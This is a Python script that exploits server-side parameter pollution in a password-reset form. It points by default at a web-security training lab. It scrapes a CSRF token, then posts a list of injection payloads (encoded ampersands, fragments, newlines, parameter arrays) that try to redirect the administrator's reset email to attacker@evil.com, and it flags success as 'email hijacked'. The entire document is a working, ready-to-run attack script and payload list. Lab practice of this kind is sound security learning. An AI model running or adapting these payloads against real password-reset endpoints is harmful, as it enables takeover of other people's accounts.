#!/usr/bin/env python3
import requests
import sys
import json
import re

def get_csrf_token(session, lab_url):
    """Extract CSRF token from the forgot-password page"""
    resp = session.get(f"{lab_url}/forgot-password")

    # Try to find CSRF token in the page
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', resp.text)
    if csrf_match:
        return csrf_match.group(1)

    # Try in hidden input
    csrf_match = re.search(r'<input[^>]*name="csrf"[^>]*value="([^"]+)"', resp.text)
    if csrf_match:
        return csrf_match.group(1)

    return None

def exploit_sspp(lab_url):
    """Exploit server-side parameter pollution"""

    session = requests.Session()

    # Get initial session and CSRF token
    print("[*] Getting session and CSRF token...")
    session.get(f"{lab_url}/login")

    csrf = get_csrf_token(session, lab_url)
    print(f"Session: {session.cookies.get('session')}")
    print(f"CSRF: {csrf or 'Not found - using dummy'}")

    if not csrf:
        csrf = "dummy"

    reset_url = f"{lab_url}/forgot-password"

    # Headers with malformed Content-Type
    headers = {
        "Content-Type": "x-www-form-urlencoded",  # MALFORMED!
        "Accept": "*/*",
        "Origin": lab_url,
        "Referer": f"{lab_url}/forgot-password",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    }

    print("\n[*] Testing server-side parameter pollution...")

    # Parameter pollution payloads
    payloads = [
        # Basic test - confirm it works normally
        f"csrf={csrf}&username=administrator",

        # URL-encoded ampersand injection
        f"csrf={csrf}&username=administrator%26email%3dattacker@evil.com",
        f"csrf={csrf}&username=administrator%26field%3demail%26value%3dattacker@evil.com",

        # Fragment injection
        f"csrf={csrf}&username=administrator%23&email=attacker@evil.com",

        # Query string injection
        f"csrf={csrf}&username=administrator%3femail=attacker@evil.com",

        # Newline injection
        f"csrf={csrf}&username=administrator%0a&email=attacker@evil.com",
        f"csrf={csrf}&username=administrator%0d%0aemail:attacker@evil.com",

        # Space injection
        f"csrf={csrf}&username=administrator email=attacker@evil.com",

        # Backend parameter guessing
        f"csrf={csrf}&username=administrator&field=email&value=attacker@evil.com",
        f"csrf={csrf}&username=administrator&_method=PUT&email=attacker@evil.com",
        f"csrf={csrf}&username=administrator&reset_token=test",

        # Parameter array
        f"csrf={csrf}&username[]=administrator&username[]=attacker@evil.com",

        # Without CSRF
        f"username=administrator%26email=attacker@evil.com",
        f"username=administrator&email=attacker@evil.com",
    ]

    for i, payload in enumerate(payloads, 1):
        print(f"\n[Test {i}] Payload: {payload[:100]}...")

        try:
            response = session.post(
                reset_url,
                data=payload,
                headers=headers,
                allow_redirects=False
            )

            print(f"Status: {response.status_code}")

            if response.status_code == 200:
                try:
                    result = response.json()
                    print(f"Response: {result}")

                    if "result" in result:
                        email = result["result"]
                        if "attacker" in email or "evil" in email:
                            print(f"\n[!!!] SUCCESS! Email hijacked to: {email}")
                            print(f"[!!!] Working payload: {payload}")

                            # Now try to get the reset token
                            print("\n[*] Checking for reset token...")
                            return True

                        elif "*****" not in email:
                            print(f"[!] Email revealed: {email}")

                except json.JSONDecodeError:
                    print(f"Non-JSON: {response.text[:100]}")

            elif response.status_code == 400:
                print("Bad request - malformed Content-Type is being rejected")

        except Exception as e:
            print(f"Error: {e}")

    # Try with correct Content-Type to see the difference
    print("\n[*] Testing with correct Content-Type...")
    headers["Content-Type"] = "application/x-www-form-urlencoded"

    response = session.post(
        reset_url,
        data=f"csrf={csrf}&username=administrator",
        headers=headers,
        allow_redirects=False
    )

    if response.status_code == 200:
        print(f"Works with correct Content-Type: {response.json()}")

    return False

if __name__ == "__main__":
    lab_url = "https://0aa1009a0379161a82cd10b40031005f.web-security-academy.net"

    if len(sys.argv) > 1:
        lab_url = sys.argv[1].rstrip('/')

    print(f"Exploiting SSPP at: {lab_url}")
    exploit_sspp(lab_url)